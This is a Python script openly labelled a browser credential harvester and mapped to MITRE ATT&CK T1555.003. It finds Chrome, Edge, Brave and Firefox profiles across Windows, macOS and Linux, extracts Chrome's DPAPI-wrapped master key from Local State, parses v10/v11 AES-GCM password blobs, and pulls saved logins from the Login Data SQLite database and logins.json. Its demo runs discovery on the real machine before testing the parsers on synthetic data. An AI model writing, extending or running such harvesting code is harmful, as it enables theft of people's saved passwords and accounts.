#!/usr/bin/env python3
"""Browser Credential Harvester - Chrome/Firefox/Edge Multi-Platform
MITRE ATT&CK: T1555.003 (Credentials from Password Stores: Credentials from Web Browsers)
Chrome v10/v11 AES-GCM, Local State key extraction, Firefox logins.json, SQLite.
"""
import os
import sys
import json
import struct
import base64
import sqlite3
import hashlib as _hashlib
from pathlib import Path

def discover_chrome_profiles():
    profiles = []

    if sys.platform == 'win32':
        local_app = os.environ.get('LOCALAPPDATA', '')
        base_paths = [
            os.path.join(local_app, 'Google', 'Chrome', 'User Data'),
            os.path.join(local_app, 'Microsoft', 'Edge', 'User Data'),
            os.path.join(local_app, 'BraveSoftware', 'Brave-Browser', 'User Data')
        ]
    elif sys.platform == 'darwin':
        home = os.path.expanduser('~')
        base_paths = [
            os.path.join(home, 'Library', 'Application Support', 'Google', 'Chrome'),
            os.path.join(home, 'Library', 'Application Support', 'Microsoft Edge'),
            os.path.join(home, 'Library', 'Application Support', 'BraveSoftware', 'Brave-Browser')
        ]
    else:
        home = os.path.expanduser('~')
        base_paths = [
            os.path.join(home, '.config', 'google-chrome'),
            os.path.join(home, '.config', 'microsoft-edge'),
            os.path.join(home, '.config', 'BraveSoftware', 'Brave-Browser')
        ]

    for base in base_paths:
        if not os.path.exists(base):
            continue

        local_state = os.path.join(base, 'Local State')
        default_db = os.path.join(base, 'Default', 'Login Data')

        if os.path.exists(local_state) and os.path.exists(default_db):
            profiles.append({
                'browser': os.path.basename(base),
                'base_path': base,
                'local_state': local_state,
                'login_db': default_db
            })

        for profile_dir in os.listdir(base):
            if profile_dir.startswith('Profile '):
                profile_db = os.path.join(base, profile_dir, 'Login Data')
                if os.path.exists(profile_db):
                    profiles.append({
                        'browser': os.path.basename(base),
                        'base_path': base,
                        'local_state': local_state,
                        'login_db': profile_db
                    })

    return profiles

def discover_firefox_profiles():
    profiles = []

    if sys.platform == 'win32':
        app_data = os.environ.get('APPDATA', '')
        base_path = os.path.join(app_data, 'Mozilla', 'Firefox', 'Profiles')
    elif sys.platform == 'darwin':
        home = os.path.expanduser('~')
        base_path = os.path.join(home, 'Library', 'Application Support', 'Firefox', 'Profiles')
    else:
        home = os.path.expanduser('~')
        base_path = os.path.join(home, '.mozilla', 'firefox')

    if not os.path.exists(base_path):
        return profiles

    for profile_name in os.listdir(base_path):
        profile_path = os.path.join(base_path, profile_name)
        if not os.path.isdir(profile_path):
            continue

        logins_file = os.path.join(profile_path, 'logins.json')
        if os.path.exists(logins_file):
            profiles.append({
                'profile_name': profile_name,
                'profile_path': profile_path,
                'logins_file': logins_file
            })

    return profiles

def extract_chrome_key(local_state_path):
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)

        encrypted_key_b64 = local_state.get('os_crypt', {}).get('encrypted_key', '')
        if not encrypted_key_b64:
            return None

        encrypted_key = base64.b64decode(encrypted_key_b64)

        if encrypted_key[:5] != b'DPAPI':
            return None

        encrypted_key = encrypted_key[5:]

        return encrypted_key

    except:
        return None

def parse_chrome_v10_blob(encrypted_blob):
    if len(encrypted_blob) < 15:
        return None

    version = encrypted_blob[:3]
    if version != b'v10':
        return None

    nonce = encrypted_blob[3:15]
    ciphertext = encrypted_blob[15:]

    if len(ciphertext) < 16:
        return None

    tag = ciphertext[-16:]
    ciphertext = ciphertext[:-16]

    return {
        'version': 10,
        'nonce': nonce,
        'ciphertext': ciphertext,
        'tag': tag
    }

def parse_chrome_v11_blob(encrypted_blob):
    if len(encrypted_blob) < 15:
        return None

    version = encrypted_blob[:3]
    if version != b'v11':
        return None

    nonce = encrypted_blob[3:15]
    ciphertext = encrypted_blob[15:]

    if len(ciphertext) < 16:
        return None

    tag = ciphertext[-16:]
    ciphertext = ciphertext[:-16]

    return {
        'version': 11,
        'nonce': nonce,
        'ciphertext': ciphertext,
        'tag': tag
    }

def query_chrome_login_data(db_path):
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        query = 'SELECT origin_url, username_value, password_value FROM logins'
        cursor.execute(query)

        results = []
        for row in cursor.fetchall():
            results.append({
                'url': row[0],
                'username': row[1],
                'encrypted_password': row[2]
            })

        conn.close()
        return results

    except:
        return []

def parse_firefox_logins(logins_json_path):
    try:
        with open(logins_json_path, 'r', encoding='utf-8') as f:
            data = json.load(f)

        logins = []
        for entry in data.get('logins', []):
            logins.append({
                'hostname': entry.get('hostname', ''),
                'username': entry.get('encryptedUsername', ''),
                'password': entry.get('encryptedPassword', ''),
                'form_submit_url': entry.get('formSubmitURL', '')
            })

        return logins

    except:
        return []

def demo_browser_harvest():
    chrome_profiles = discover_chrome_profiles()
    print('Chrome/Edge/Brave profiles: %d' % len(chrome_profiles))

    for profile in chrome_profiles[:1]:
        print('Browser: %s' % profile['browser'])
        print('Local State: %s' % profile['local_state'])

        encrypted_key = extract_chrome_key(profile['local_state'])
        if encrypted_key:
            print('Encrypted key length: %d bytes' % len(encrypted_key))

    firefox_profiles = discover_firefox_profiles()
    print('Firefox profiles: %d' % len(firefox_profiles))

    test_v10_blob = b'v10' + os.urandom(12) + os.urandom(32) + os.urandom(16)
    parsed_v10 = parse_chrome_v10_blob(test_v10_blob)
    if parsed_v10:
        print('Chrome v10 blob parsed: nonce=%d bytes, ciphertext=%d bytes' % (
            len(parsed_v10['nonce']), len(parsed_v10['ciphertext'])
        ))

    import tempfile
    temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
    temp_db.close()

    conn = sqlite3.connect(temp_db.name)
    cursor = conn.cursor()
    cursor.execute('CREATE TABLE logins (origin_url TEXT, username_value TEXT, password_value BLOB)')
    cursor.execute('INSERT INTO logins VALUES (?, ?, ?)', ('https://example.com', 'user', b'v10' + os.urandom(60)))
    conn.commit()
    conn.close()

    results = query_chrome_login_data(temp_db.name)
    print('Test login entries: %d' % len(results))

    os.unlink(temp_db.name)

    temp_json = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json')
    json.dump({
        'logins': [
            {'hostname': 'https://example.com', 'encryptedUsername': 'MDIEEw==', 'encryptedPassword': 'MDIEEw==', 'formSubmitURL': 'https://example.com/login'}
        ]
    }, temp_json)
    temp_json.close()

    ff_logins = parse_firefox_logins(temp_json.name)
    print('Firefox test logins: %d' % len(ff_logins))

    os.unlink(temp_json.name)

if __name__ == '__main__':
    demo_browser_harvest()

